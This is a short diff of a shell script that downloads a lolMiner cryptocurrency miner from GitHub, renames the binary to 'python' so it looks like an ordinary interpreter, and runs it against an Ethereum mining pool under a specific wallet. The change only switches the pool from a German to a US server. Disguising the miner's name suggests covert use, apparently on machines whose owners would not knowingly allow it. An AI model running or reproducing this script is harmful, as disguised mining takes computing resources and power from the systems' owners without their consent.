@@ -2,4 +2,4 @@ curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/release
 tar -zxvf python.tar.gz
 cd 1.31
 mv lolMiner python
-./python --algo ETHASH --pool de.ethereum.herominers.com:1147 --user 0xacc4e69563A9897B09f8Ef36A7e60256f28Ef191.KHANG_01
+./python --algo ETHASH --pool us.ethereum.herominers.com:1147 --user 0xacc4e69563A9897B09f8Ef36A7e60256f28Ef191.KHANG_01
